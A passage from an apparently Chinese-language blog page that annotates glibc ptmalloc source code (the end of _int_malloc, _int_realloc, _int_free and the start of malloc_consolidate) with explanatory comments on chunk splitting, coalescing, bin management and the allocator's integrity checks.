class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          bck = unsorted_chunks (av);</span><br><span class="line">          fwd = bck-&gt;fd;</span><br><span class="line">	        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">          &#125;</span><br><span class="line">          remainder-&gt;bk = bck;</span><br><span class="line">          remainder-&gt;fd = fwd;</span><br><span class="line">          bck-&gt;fd = remainder;</span><br><span class="line">          fwd-&gt;bk = remainder;</span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            <span class="comment">//剩余部分chunk属于smallbin,将分配区的last_remainder chunk设置为剩余部分构成的chunk</span></span><br><span class="line">            av-&gt;last_remainder = remainder;</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (remainder_size)) &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  use_top:</span><br><span class="line">    <span class="comment">//从top chunk中分配所需chunk</span></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line">    <span class="comment">//将当前分配区的top chunk赋值给victim,并获得victim的大小</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) &#123;</span><br><span class="line">      <span class="comment">//top chunk切分出所需chunk后还需要MINSIZE的空间来作为fencepost</span></span><br><span class="line">      <span class="comment">//切分后的剩余部分将作为新的top chunk,原top chunk的fencepost仍然作为新的top chunk的fencepost,所以切分之后剩余的chunk不用set_foot</span></span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av)) &#123;</span><br><span class="line">      <span class="comment">//如果top chunk也不能满足要求,查看fastbin中是否有空闲chunk存在,因为free属于fastbin的chunk时不需要获得分配区的锁,调用malloc_consolidate函数并重新设置当前bin的index,再次循环</span></span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//如果fastbin中没有空闲chunk存在,向系统申请内存</span></span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="int-realloc"><a href="#int-realloc" class="headerlink" title="_int_realloc"></a>_int_realloc</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// _int_realloc函数用于重新分配内存块。它尝试更改内存块的大小并可能移动它以满足新的大小要求。</span></span><br><span class="line"><span class="comment">// 参数:</span></span><br><span class="line"><span class="comment">// av - 指向内存状态的指针。</span></span><br><span class="line"><span class="comment">// oldp - 指向当前内存块的指针。</span></span><br><span class="line"><span class="comment">// oldsize - 当前内存块的大小。</span></span><br><span class="line"><span class="comment">// nb - 请求的新大小。</span></span><br><span class="line"><span class="type">void</span>* _int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize, INTERNAL_SIZE_T nb) &#123;</span><br><span class="line">  <span class="comment">// 定义一系列局部变量来存储分配的状态和中间结果。</span></span><br><span class="line">  mchunkptr newp; <span class="comment">// 新分配的内存块指针。</span></span><br><span class="line">  INTERNAL_SIZE_T newsize; <span class="comment">// 新内存块的大小。</span></span><br><span class="line">  <span class="type">void</span>* newmem; <span class="comment">// 对应用户内存的指针。</span></span><br><span class="line"></span><br><span class="line">  mchunkptr next; <span class="comment">// 指向oldp后面的连续内存块。</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder; <span class="comment">// 新分配内存后剩余的内存块。</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size; <span class="comment">// 剩余内存块的大小。</span></span><br><span class="line"></span><br><span class="line">  mchunkptr bck; <span class="comment">// 用于链接的临时变量。</span></span><br><span class="line">  mchunkptr fwd; <span class="comment">// 用于链接的临时变量。</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> copysize; <span class="comment">// 需要复制的字节数。</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ncopies; <span class="comment">// 需要复制的INTERNAL_SIZE_T字数。</span></span><br><span class="line">  INTERNAL_SIZE_T* s; <span class="comment">// 复制源的指针。</span></span><br><span class="line">  INTERNAL_SIZE_T* d; <span class="comment">// 复制目标的指针。</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>; <span class="comment">// 用于错误处理的字符串。</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查oldp的大小是否合法。</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(oldp-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(oldsize &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;realloc(): invalid old size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, oldp); <span class="comment">// 检查oldp是否正在使用中。</span></span><br><span class="line"></span><br><span class="line">  assert(!chunk_is_mmapped(oldp)); <span class="comment">// 确保oldp不是映射内存。</span></span><br><span class="line"></span><br><span class="line">  next = chunk_at_offset(oldp, oldsize); <span class="comment">// 计算下一个内存块的位置。</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize = chunksize(next); <span class="comment">// 获取下一个内存块的大小。</span></span><br><span class="line">  <span class="comment">// 检查下一个内存块的大小是否合法。</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(next-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;realloc(): invalid next size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果当前内存块已经足够大，则直接返回当前内存块。</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(oldsize) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb)) &#123;</span><br><span class="line">    newp = oldp;</span><br><span class="line">    newsize = oldsize;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果下一个内存块是顶部内存块，并且可以合并以满足请求的大小，则进行合并。</span></span><br><span class="line">    <span class="keyword">if</span> (next == av-&gt;top &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>)(newsize = oldsize + nextsize) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE)) &#123;</span><br><span class="line">      set_head_size(oldp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      av-&gt;top = chunk_at_offset(oldp, nb);</span><br><span class="line">      set_head(av-&gt;top, (newsize - nb) | PREV_INUSE);</span><br><span class="line">      check_inuse_chunk(av, oldp);</span><br><span class="line">      <span class="keyword">return</span> chunk2mem(oldp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果下一个内存块不在使用中，并且可以合并以满足请求的大小，则进行合并。</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (next != av-&gt;top &amp;&amp; !inuse(next) &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>)(newsize = oldsize + nextsize) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb)) &#123;</span><br><span class="line">      newp = oldp;</span><br><span class="line">      unlink(av, next, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 否则，分配新内存，复制数据，然后释放旧内存。</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      newmem = _int_malloc(av, nb - MALLOC_ALIGN_MASK);</span><br><span class="line">      <span class="keyword">if</span> (newmem == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 如果分配失败，则返回0。</span></span><br><span class="line"></span><br><span class="line">      newp = mem2chunk(newmem);</span><br><span class="line">      newsize = chunksize(newp);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果新分配的内存块紧跟在旧内存块后面，则合并这两个内存块。</span></span><br><span class="line">      <span class="keyword">if</span> (newp == next) &#123;</span><br><span class="line">        newsize += oldsize;</span><br><span class="line">        newp = oldp;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 否则，复制旧内存块的内容到新内存块。</span></span><br><span class="line">        copysize = oldsize - SIZE_SZ;</span><br><span class="line">        s = (INTERNAL_SIZE_T*)(chunk2mem(oldp));</span><br><span class="line">        d = (INTERNAL_SIZE_T*)(newmem);</span><br><span class="line">        ncopies = copysize / <span class="keyword">sizeof</span>(INTERNAL_SIZE_T);</span><br><span class="line">        assert(ncopies &gt;= <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ncopies &gt; <span class="number">9</span>)</span><br><span class="line">          <span class="built_in">memcpy</span>(d, s, copysize);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 对于小内存块，使用手动复制以提高效率。</span></span><br><span class="line">          *(d + <span class="number">0</span>) = *(s + <span class="number">0</span>);</span><br><span class="line">          *(d + <span class="number">1</span>) = *(s + <span class="number">1</span>);</span><br><span class="line">          *(d + <span class="number">2</span>) = *(s + <span class="number">2</span>);</span><br><span class="line">          <span class="keyword">if</span> (ncopies &gt; <span class="number">4</span>) &#123;</span><br><span class="line">            *(d + <span class="number">3</span>) = *(s + <span class="number">3</span>);</span><br><span class="line">            *(d + <span class="number">4</span>) = *(s + <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">if</span> (ncopies &gt; <span class="number">6</span>) &#123;</span><br><span class="line">              *(d + <span class="number">5</span>) = *(s + <span class="number">5</span>);</span><br><span class="line">              *(d + <span class="number">6</span>) = *(s + <span class="number">6</span>);</span><br><span class="line">              <span class="keyword">if</span> (ncopies &gt; <span class="number">8</span>) &#123;</span><br><span class="line">                *(d + <span class="number">7</span>) = *(s + <span class="number">7</span>);</span><br><span class="line">                *(d + <span class="number">8</span>) = *(s + <span class="number">8</span>);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _int_free(av, oldp, <span class="number">1</span>); <span class="comment">// 释放旧内存块。</span></span><br><span class="line">        check_inuse_chunk(av, newp); <span class="comment">// 检查新内存块是否正在使用中。</span></span><br><span class="line">        <span class="keyword">return</span> chunk2mem(newp); <span class="comment">// 返回新内存块的用户可用部分。</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 尝试释放新内存块中的多余空间。</span></span><br><span class="line">  assert((<span class="type">unsigned</span> <span class="type">long</span>)(newsize) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb));</span><br><span class="line">  remainder_size = newsize - nb;</span><br><span class="line">  <span class="comment">// 如果剩余空间太小，无法分割为独立的内存块，则保留它。</span></span><br><span class="line">  <span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">    set_head_size(newp, newsize | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_inuse_bit_at_offset(newp, newsize);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 否则，分割剩余空间为独立的内存块。</span></span><br><span class="line">    remainder = chunk_at_offset(newp, nb);</span><br><span class="line">    set_head_size(newp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_inuse_bit_at_offset(remainder, remainder_size); <span class="comment">// 标记剩余部分为正在使用中，以便_free()不会报错。</span></span><br><span class="line">    _int_free(av, remainder, <span class="number">1</span>); <span class="comment">// 释放剩余部分。</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, newp); <span class="comment">// 检查新内存块是否正在使用中。</span></span><br><span class="line">  <span class="keyword">return</span> chunk2mem(newp); <span class="comment">// 返回新内存块的用户可用部分。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock) &#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* 释放的chunk的size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* 对应的fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* 内存空间中下一个chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* 下一个chunk的大小 */</span></span><br><span class="line">  <span class="type">int</span> nextinuse;               <span class="comment">/* 下一个chunk是否在使用 */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* 内存空间中上一个chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* 用于储存bin链表指针 */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* 用于储存bin链表指针 */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">int</span> locked = <span class="number">0</span>;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>) || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="comment">//chunk的指针地址不能溢出</span></span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">      (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) &#123;</span><br><span class="line">    <span class="comment">//chunk的大小必须大于等于MINSIZE且对齐</span></span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">//当前free的chunk属于fastbin</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">      <span class="comment">//查看下一个相邻的chunk的大小是否小于等于2 * SIZE_SZ,或是否大于分配区所分配的内存总量</span></span><br><span class="line">	    <span class="keyword">if</span> (have_lock || (&#123; assert (locked == <span class="number">0</span>); mutex_lock(&amp;av-&gt;mutex); locked = <span class="number">1</span>; chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; &#125;)) &#123;</span><br><span class="line">	      errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">	      <span class="keyword">goto</span> errout;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">	      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">	      locked = <span class="number">0</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">        <span class="comment">//读取分配区所分配的内存总量需要对分配区加锁,检查完以后,释放分配区的锁</span></span><br><span class="line">    &#125;</span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line">    <span class="comment">//设置当前分配区的fastbin的flag,表示当前分配区的fastbin中已有空闲chunk.然后根据当前free的chunk大小获取所属的fastbin</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="comment">//fastbin double free检测</span></span><br><span class="line">	      errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">	      <span class="keyword">goto</span> errout;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">	      old_idx = fastbin_index(chunksize(old));</span><br><span class="line">	    p-&gt;fd = old2 = old;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line">    <span class="comment">//使用lock-free技术实现fastbin的单向链表插入操作</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="comment">//当前free的chunk不是通过mmap分配的,并且当前还没有获得分配区的锁,获取分配区的锁</span></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top)) &#123;</span><br><span class="line">      <span class="comment">//free的是top chunk</span></span><br><span class="line">	    errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av) &amp;&amp; (<span class="type">char</span> *) nextchunk &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>)) &#123;</span><br><span class="line">      <span class="comment">//内存中下一个chunk的地址大于top chunk的末尾</span></span><br><span class="line">	    errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk))) &#123;</span><br><span class="line">      <span class="comment">//该chunk已经是free状态</span></span><br><span class="line">	    errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">      <span class="comment">//查看下一个相邻的chunk的大小是否小于等于2 * SIZE_SZ,或是否大于分配区所分配的内存总量</span></span><br><span class="line">	    errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      <span class="comment">//如果当前free的chunk的前一个相邻chunk为空闲状态,与前一个空闲chunk合并</span></span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">//与当前free的chunk相邻的下一个chunk不是分配区的top chunk</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        <span class="comment">//如果当前free的chunk的下一个相邻chunk为空闲状态,与下一个空闲chunk合并</span></span><br><span class="line">	      unlink(av, nextchunk, bck, fwd);</span><br><span class="line">	      size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="comment">//与当前free的chunk相邻的下一个chunk处于inuse状态,清除当前chunk的inuse状态</span></span><br><span class="line">	      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) &#123;</span><br><span class="line">        <span class="comment">//unsorted_bin第一个chunk的fd的bk不是第一个chunk</span></span><br><span class="line">	      errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">	      <span class="keyword">goto</span> errout;</span><br><span class="line">	    &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size)) &#123;</span><br><span class="line">	      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line">      <span class="comment">//将合并后的chunk加入unsorted_bin的双向循环链表中</span></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//当前free的chunk下一个相邻的chunk为top chunk,则将当前chunk合并入top chunk</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="comment">//如果合并后的chunk大小大于64KB</span></span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">	      malloc_consolidate(av);</span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">	      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))</span><br><span class="line">          <span class="comment">//如果当前分配区为主分配区且top chunk的大小大于heap的收缩阈值,调用systrim函数收缩heap</span></span><br><span class="line">	        systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//为非主分配区,调用heap_trim函数收缩非主分配区的sub_heap</span></span><br><span class="line">	      heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line">	      assert(heap-&gt;ar_ptr == av);</span><br><span class="line">	      heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      <span class="comment">//有锁则对分配区解锁</span></span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//当前free的chunk是通过mmap分配则调用munma_chunk释放</span></span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span> &#123;</span><br><span class="line">  mfastbinptr*    fb;</span><br><span class="line">  mfastbinptr*    maxfb;</span><br><span class="line">  mchunkptr       p;</span><br><span class="line">  mchunkptr       nextp;</span><br><span class="line">  mchunkptr       unsorted_bin;</span><br><span class="line">  mchunkptr       first_unsorted;</span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//global_max_fast不为0,表示ptmalloc已经初始化,清除分配区flag中fastbin的标志位</span></span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//将分配区最大的一个fastbin赋值给maxfb,第一个fastbin赋值给fb,然后遍历fastbin</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span 